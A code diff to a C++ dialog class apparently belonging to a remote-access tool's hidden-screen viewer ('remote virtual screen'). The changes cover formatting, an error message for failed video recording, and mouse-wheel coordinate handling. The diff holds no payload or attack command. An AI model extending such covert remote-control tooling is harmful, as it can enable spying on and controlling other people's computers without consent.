@@ -158,7 +158,7 @@ BOOL CHideScreenSpyDlg::OnInitDialog()
     __super::OnInitDialog();
     CString strString;
     strString.FormatL("%s - 远程虚拟屏幕 %d×%d", m_IPAddress,
-                     m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
+                      m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
     SetWindowText(strString);
 
     // Set the icon for this dialog.  The framework does this automatically
@@ -467,8 +467,9 @@ void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
         FCCHandler handler = nID == IDM_SAVEAVI_S ? ENCODER_MJPEG : ENCODER_H264;
         int code;
         if (code = m_aviStream.Open(m_aviFile, m_BitmapInfor_Full, rate, handler)) {
-            MessageBoxL(CString("Create Video(*.avi) Failed:\n") + m_aviFile + "\r\n错误代码: " +
-                       CBmpToAvi::GetErrMsg(code).c_str(), "提示", MB_ICONINFORMATION);
+            CString msg;
+            msg.FormatL("创建录像文件失败: %s\r\n错误代码: %s", m_aviFile.GetString(), CBmpToAvi::GetErrMsg(code).c_str());
+            MessageBox(msg, _TR("提示"), MB_ICONINFORMATION);
             m_aviFile = _T("");
         } else {
             ::SetTimer(m_hWnd, TIMER_ID, duration, NULL);
@@ -713,12 +714,20 @@ BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
     case WM_LBUTTONDBLCLK:
     case WM_RBUTTONDBLCLK:
     case WM_MBUTTONDBLCLK: // 双击
-    case WM_MOUSEMOVE:
-    case WM_MOUSEWHEEL: { // 鼠标移动
+    case WM_MOUSEMOVE: {
         // 此逻辑会丢弃所有 非左键拖拽 的鼠标移动消息（如纯移动或右键拖拽）
         if (pMsg->message == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
             break;
         SendScaledMouseMessage(pMsg, true);
+        return TRUE;
+    }
+    case WM_MOUSEWHEEL: {
+        // WM_MOUSEWHEEL 的 lParam 是屏幕坐标，需要转换为客户区坐标
+        POINT pt = { GET_X_LPARAM(pMsg->lParam), GET_Y_LPARAM(pMsg->lParam) };
+        ScreenToClient(&pt);
+        MSG wheelMsg = *pMsg;
+        wheelMsg.lParam = MAKELPARAM(pt.x, pt.y);
+        SendScaledMouseMessage(&wheelMsg, true);
         return TRUE;
     }
     case WM_CHAR: {
